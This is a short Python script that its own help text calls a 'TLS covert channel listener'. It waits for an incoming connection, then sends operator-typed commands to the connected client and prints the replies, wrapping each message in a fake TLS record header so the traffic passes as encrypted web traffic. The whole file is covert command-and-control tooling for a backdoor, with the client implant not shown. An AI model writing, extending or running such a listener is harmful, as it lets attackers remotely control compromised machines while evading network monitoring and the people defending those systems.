import socket
import argparse
import time


def encodePacket(data):
    """
    TODO: test
    """
    tlsHeader = bytes([0x17,0x03,0x01])
    length = len(data)
    toSend = tlsHeader + length.to_bytes(2, 'big') + data
    return toSend

def recievePacket(sock):
    """
    TODO: test
    """
    data = bytearray() 
    headIn = sock.recv(5)
    lenfromhead = int.from_bytes(headIn[3:], "big")
    return sock.recv(lenfromhead)


def run(port):
    """TODO:
    run server on port
    """
    while True:
        #Loop and wait for connections
        print("Waiting for connection...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        sock.bind(('0.0.0.0', int(port)))
        sock.listen()
        sock, addr = sock.accept()
        print("Connected to : {}".format(addr))
        print("Type 'exit' to disconnect.")
        #Recieve initiallization
        recievePacket(sock)
        while True:
            command = input(">")
            toSend = encodePacket(command.encode())
            if command == "exit":
                print("Sending exit...")
                try:
                    sock.send(toSend)
                finally:
                    sock.close()
                    print(f"Lost connection to {addr}")
                    break
            else:
                try:
                    sock.send(toSend)
                except:
                    sock.close()
                    print(f"Lost connection to {addr}")
                    break
            response = recievePacket(sock)
            print(response.decode("utf-8"))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Program to provide TLS covert channel listiner.',
                                 usage="\n"
                                       "%(prog)s [PORT]"
                                       "\nUse '%(prog)s -h' for more information.")
    parser.add_argument('port', help="Port to listen on.")
    args = parser.parse_args()
    run(args.port)


